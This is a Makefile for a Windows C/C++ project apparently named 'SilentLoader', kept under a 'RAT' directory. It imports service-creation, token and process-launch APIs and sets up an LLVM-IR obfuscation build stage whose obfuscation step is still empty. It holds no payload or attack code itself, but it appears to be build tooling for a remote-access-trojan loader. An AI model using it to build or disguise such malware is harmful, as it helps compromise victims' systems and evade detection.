#np Shell32(ShellExecuteExW)
#np user32(MessageBoxW)
#np Advapi32(ConvertSidToStringSidW, GetTokenInformation, IsValidSid, OpenSCManagerA, CreateServiceA, CloseServiceHandle)

#* VARIABLES
ROOT_DIR=D:\D\my\tech\RAT\makeSolution\SilentLoader
REM=D:\D\my\tech\RAT\makeSolution\tools\rm\rm.exe

C=clang
CXX=clang++
CXX_STD=--std=c++17
OPT=-Ofast
DEP_FLAGS=-MD -MF
INC_DIR=-I ./sourcefiles/Settings/
LIBS=-luser32 -lAdvapi32 -lShell32

CODE_DIRS=./src ./src/rsrc ./src/sourcefiles/*
BUILD=release
BIN_PATH=build/${BUILD}/
BINARY=${BIN_PATH}main

CFILES=$(foreach D, $(CODE_DIRS), $(wildcard $(D)/*.c))
CPPFILES=$(foreach D, $(CODE_DIRS), $(wildcard $(D)/*.cpp))
DEPFILES=$(foreach D, $(CODE_DIRS), $(wildcard $(D)/*.d))
ASMFILES=$(foreach D, $(CODE_DIRS), $(wildcard $(D)/*.asm))
RSRCFILES=$(foreach D, ${CODE_DIRS}, $(wildcard $(D)/*.rc))

OBJFILES=$(patsubst %,%.o,$(CFILES) $(CPPFILES) $(RSRCFILES) $(ASMFILES))
IRFILES=$(patsubst %,%.ll,$(CFILES) $(CPPFILES))
IROBJFILES=$(patsubst %,%.ll.o,$(CFILES) $(CPPFILES)) $(patsubst %,%.o,$(RSRCFILES) $(ASMFILES))

OUTPUT_FILES=${BINARY}.exe ${BINARY}.ilk ${BINARY}.pdb ${OBJFILES} ${IRFILES} ${IROBJFILES} ${DEPFILES}

#* RUN RELEASE
pe: ${BINARY}.exe
obf: ${IRFILES}
	make pe OBJFILES="${IROBJFILES}"

#* RUN DEBUG
dbg:
	make pe dbg_flag=-g BUILD=debug
dbgobf:
	make obf dbg_flag=-g BUILD=debug

#*======================= LINKING
${BINARY}.exe:${OBJFILES} 
	${CXX} -v $(dbg_flag) ${OBJFILES} ${OPT} -o $@ ${LIBS}

#*======================= COMPILING SRC_CODE
%.c.o:%.c
	${C} -c ${INC_DIR} ${OPT} $(dbg_flag) $< -o $@
%.cpp.o:%.cpp
	${CXX} ${INC_DIR} ${CXX_STD} $(dbg_flag) -c ${OPT} -o $@ $^
%.asm.o:%.asm
	ml64.exe /c /nologo /Zi /Fo $@ /W3 /errorReport:prompt  /Ta $^
%.rc.o:%.rc
	windres -o $@ $^

#*======================= LLVM OBFUSCATION
#* COMPILING to .ll
%.c.ll:%.c
	${C} ${OPT} -S -emit-llvm $^ -o $@
%.cpp.ll:%.cpp
	${CXX} ${CXX_STD} ${OPT} -S -emit-llvm $(dbg_flag) $^ -o $@

obfuscate: 
#?	nothing yet
#* ASSEMBLING
%.ll.o:%.ll
	llc ${OPT} -filetype=obj $< -o $@
%.ll.o:%.ll
	llc ${OPT} -filetype=obj $< -o $@

#*======================= CLEANING
delOldRsrc:
	${REM} -rf ${ROOT_DIR}\src\rsrc\resource.rc.o

clean:
	make rmFiles BUILD=debug
	make rmFiles BUILD=release
rmFiles:
	${REM} -rf ${OUTPUT_FILES}
